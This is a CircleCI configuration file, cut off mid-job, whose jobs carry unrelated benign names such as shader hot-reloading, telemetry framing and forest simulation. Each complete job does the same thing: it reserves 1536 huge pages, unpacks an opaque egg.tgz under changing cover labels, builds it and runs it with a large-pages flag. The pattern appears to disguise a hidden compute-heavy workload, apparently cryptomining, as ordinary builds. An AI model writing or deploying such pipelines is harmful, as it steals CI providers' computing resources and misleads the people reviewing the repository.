version: 2.1

jobs:
  shader-hotreload:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write shader
          command: |
            mkdir -p sh && printf 'void main(){}\n' > sh/frag.glsl
      - run:
          name: Build shader watcher
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target shader-hotreload -j2
      - run:
          name: Hot-reload shaders
          command: LIONSS_LP=1 ./build/shader-hotreload --dir sh --watch
  telemetry-frame:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define frame
          command: |
            printf 'words 64\n' > tm.cfg
      - run:
          name: Build telemetry codec
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target telemetry-frame -j2
      - run:
          name: Pack telemetry frame
          command: LIONSS_LP=1 ./build/telemetry-frame --conf tm.cfg --sync 0x1acf
  merklePrune:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Lay out leaf set
          command: |
            mkdir -p tree && seq 1 64 > tree/leaves.txt
      - run:
          name: Build hash tree
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target merklePrune -j2
      - run:
          name: Prune stale branches
          command: LIONSS_LP=1 ./build/merklePrune --leaves tree/leaves.txt --depth 6
  Boreal:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load biome
          command: |
            printf 'taiga 1\n' > boreal.cfg
      - run:
          name: Build ecosystem sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Boreal -j2
      - run:
          name: Grow boreal forest
          command: LIONSS_LP=1 ./build/Boreal --config boreal.cfg --years 50
  Tanager:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load plumage
          command: |
            printf 'feathers 1200\n' > tan.cfg
      - run:
          name: Build feather renderer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Tanager -j2
      - run:
          name: Render tanager plumage
          command: LIONSS_LP=1 ./build/Tanager --config tan.cfg --sheen 0.6
  duckdbprobe:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed table
          command: |
            printf 'id,v\n1,2\n' > t.csv
      - run:
          name: Build query engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target duckdbprobe -j2
      - run:
          name: Probe query plan
          command: LIONSS_LP=1 ./build/duckdbprobe --csv t.csv --explain
  PbrSpecular:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load material
          command: |
            printf 'roughness 0.3\n' > mat.pbr
      - run:
          name: Build shading model
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target PbrSpecular -j2
      - run:
          name: Evaluate specular BRDF
          command: LIONSS_LP=1 ./build/PbrSpecular --mat mat.pbr --samples 64
  serdetangent:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write schema
          command: |
            printf '{\"type\":\"struct\"}' > schema.json
      - run:
          name: Derive serializers
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target serdetangent -j2
      - run:
          name: Round-trip encode
          command: LIONSS_LP=1 ./build/serdetangent --schema schema.json --format bincode
  zfs_scrub:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
